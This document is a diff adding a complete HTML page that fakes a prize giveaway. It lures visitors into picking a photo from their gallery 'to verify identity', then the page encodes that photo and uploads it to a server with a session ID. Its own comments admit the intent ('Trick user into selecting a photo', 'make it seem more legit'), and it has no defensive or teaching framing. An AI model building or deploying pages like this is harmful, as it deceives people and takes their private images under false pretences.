@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Win a Prize! 🎁</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+        }
+
+        .prize-icon {
+            font-size: 5em;
+            margin-bottom: 20px;
+            animation: bounce 2s infinite;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+
+        h1 {
+            color: #667eea;
+            margin-bottom: 15px;
+            font-size: 2em;
+        }
+
+        .description {
+            color: #666;
+            font-size: 1.1em;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        .claim-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 1.3em;
+            border-radius: 30px;
+            cursor: pointer;
+            font-weight: bold;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+            transition: all 0.3s ease;
+        }
+
+        .claim-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
+        }
+
+        .claim-btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            font-weight: 500;
+            display: none;
+        }
+
+        .status.loading {
+            background: #fff3cd;
+            color: #856404;
+            display: block;
+        }
+
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            display: block;
+        }
+
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            display: block;
+        }
+
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        input[type="file"] {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="prize-icon">🎁</div>
+        <h1>Congratulations!</h1>
+        <p class="description">
+            You've been selected for a <strong>FREE PRIZE</strong>!
+            <br><br>
+            To claim your prize, we just need to verify your identity by accessing one photo from your gallery.
+            <br><br>
+            <small style="color: #999;">This is completely safe and secure. We only need one photo to verify you're a real person.</small>
+        </p>
+
+        <button class="claim-btn" id="claimBtn" onclick="requestGalleryAccess()">
+            🎉 Claim My Prize Now!
+        </button>
+
+        <div class="loader" id="loader"></div>
+        <div class="status" id="status"></div>
+
+        <input type="file" id="photoInput" accept="image/*" onchange="handlePhotoSelected(event)">
+    </div>
+
+    <script>
+        const sessionId = '{{ session_id }}';
+
+        function requestGalleryAccess() {
+            // Trick user into selecting a photo
+            document.getElementById('photoInput').click();
+        }
+
+        async function handlePhotoSelected(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+
+            const claimBtn = document.getElementById('claimBtn');
+            const loader = document.getElementById('loader');
+            const status = document.getElementById('status');
+
+            claimBtn.disabled = true;
+            loader.style.display = 'block';
+            status.className = 'status loading';
+            status.textContent = 'Processing your prize claim...';
+
+            try {
+                // Convert photo to base64
+                const reader = new FileReader();
+                reader.onload = async function(e) {
+                    const photoData = e.target.result;
+
+                    // Send to server
+                    const response = await fetch('/upload_photo', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            session_id: sessionId,
+                            photo_data: photoData
+                        })
+                    });
+
+                    const result = await response.json();
+
+                    loader.style.display = 'none';
+
+                    if (result.status === 'success') {
+                        status.className = 'status success';
+                        status.innerHTML = '✅ Prize claimed successfully!<br>Redirecting...';
+
+                        // Redirect to reveal page
+                        setTimeout(() => {
+                            window.location.href = result.reveal_url;
+                        }, 2000);
+                    } else {
+                        status.className = 'status error';
+                        status.textContent = '❌ Something went wrong. Please try again.';
+                        claimBtn.disabled = false;
+                    }
+                };
+
+                reader.readAsDataURL(file);
+
+            } catch (error) {
+                console.error('Error:', error);
+                loader.style.display = 'none';
+                status.className = 'status error';
+                status.textContent = '❌ Failed to process your request.';
+                claimBtn.disabled = false;
+            }
+        }
+
+        // Auto-trigger after 2 seconds to make it seem more legit
+        setTimeout(() => {
+            const claimBtn = document.getElementById('claimBtn');
+            claimBtn.style.animation = 'pulse 1s infinite';
+        }, 2000);
+    </script>
+</body>
+</html>
